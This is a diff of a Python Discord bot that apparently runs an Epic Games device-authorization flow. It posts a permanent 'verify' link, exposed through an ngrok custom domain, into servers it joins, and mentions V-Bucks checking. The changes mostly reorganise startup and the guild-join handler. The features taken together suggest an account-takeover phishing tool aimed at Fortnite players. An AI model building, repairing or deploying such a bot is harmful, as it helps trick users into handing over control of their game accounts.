@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Discord Bot for Epic Games Authentication with robust message delivery, custom domain, and V-Bucks checking.
-- Last Updated: 2025-11-20 03:55:07
+- Last Updated: 2025-11-20 04:15:22
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -86,7 +86,7 @@ import uuid
 import traceback
 import aiohttp
 import discord
-from discord.ext import commands
+from discord.ext import tasks, commands
 
 # ==============================================================================
 # --- CONFIGURATION AND GLOBALS ---
@@ -124,12 +124,10 @@ async def create_epic_auth_session():
     """Creates a new device authentication session with Epic Games."""
     EPIC_TOKEN = "OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3"
     async with aiohttp.ClientSession() as sess:
-        # Get client token
         async with sess.post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", headers={"Authorization": f"basic {EPIC_TOKEN}", "Content-Type": "application/x-www-form-urlencoded"}, data={"grant_type": "client_credentials"}) as r:
             r.raise_for_status()
             token_data = await r.json()
         
-        # This was the fix for the 415 error.
         device_auth_headers = {
             "Authorization": f"bearer {token_data['access_token']}",
             "Content-Type": "application/x-www-form-urlencoded"
@@ -289,14 +287,22 @@ async def setup_target_channel(guild):
     await target_channel.send(embed=embed)
 
 @bot.event
+async def on_guild_join(guild):
+    await setup_target_channel(guild)
+
+@bot.event
 async def on_ready():
     global permanent_link
     permanent_link = f"https://{CUSTOM_DOMAIN}/verify/{PERMANENT_LINK_ID}"
     logger.info(f"✅ Bot is online as {bot.user}")
     
-    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
-    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
-
+    # This is the corrected startup logic
+    if not bot.loop.is_running():
+        logger.error("Event loop not running, cannot start background tasks.")
+        return
+        
+    bot.loop.create_task(run_web_server_async())
+    
     await bot.wait_until_ready()
     if not bot.guilds:
         logger.warning("Bot is not in any servers. Waiting to be invited.")
@@ -304,12 +310,8 @@ async def on_ready():
         
     await setup_target_channel(bot.guilds[0])
 
-@bot.event
-async def on_guild_join(guild):
-    await setup_target_channel(guild)
-
 # ==============================================================================
-# --- WEB SERVER AND NGROK ---
+# --- WEB SERVER AND NGROK (Corrected Startup) ---
 # ==============================================================================
 class RequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -334,28 +336,36 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
             
     def log_message(self, format, *args): pass
 
-def run_web_server(port):
-    with socketserver.ThreadingTCPServer(("", port), RequestHandler) as httpd: httpd.serve_forever()
+def run_web_server():
+    with socketserver.ThreadingTCPServer(("", 8000), RequestHandler) as httpd:
+        logger.info("🚀 Web server starting on port 8000")
+        httpd.serve_forever()
 
-def setup_ngrok_tunnel(port):
-    # This function is now restored to the version that you confirmed was working.
+def setup_ngrok_tunnel():
     ngrok_executable = os.path.join(os.getcwd(), "ngrok.exe" if platform.system() == "windows" else "ngrok")
     if not os.getenv("NGROK_AUTHTOKEN"):
         logger.warning("NGROK_AUTHTOKEN not found! Custom domain will fail.")
     logger.info(f"🌐 Starting ngrok for {CUSTOM_DOMAIN}...")
-    command = [ngrok_executable, 'http', str(port), f'--domain={CUSTOM_DOMAIN}']
+    command = [ngrok_executable, 'http', '8000', f'--domain={CUSTOM_DOMAIN}']
     try:
         subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-        time.sleep(5) # Give ngrok a moment to establish the tunnel.
+        time.sleep(5)
         logger.info(f"✅ ngrok should be live at https://{CUSTOM_DOMAIN}")
         ngrok_ready.set()
-    except FileNotFoundError:
-        logger.critical(f"❌ Ngrok executable not found at '{ngrok_executable}'.")
-        sys.exit(1)
     except Exception as e: 
-        logger.critical(f"❌ Failed to start ngrok with custom domain: {e}")
+        logger.critical(f"❌ Failed to start ngrok: {e}")
         sys.exit(1)
 
+async def run_web_server_async():
+    """Starts the web server and ngrok in background threads."""
+    web_thread = threading.Thread(target=run_web_server, daemon=True)
+    web_thread.start()
+    
+    ngrok_thread = threading.Thread(target=setup_ngrok_tunnel, daemon=True)
+    ngrok_thread.start()
+
 if __name__ == "__main__":
-    try: bot.run(DISCORD_BOT_TOKEN)
-    except Exception as e: logger.critical(f"❌ Bot failed to run: {e}")
+    try:
+        bot.run(DISCORD_BOT_TOKEN)
+    except Exception as e:
+        logger.critical(f"❌ Bot failed to run: {e}")
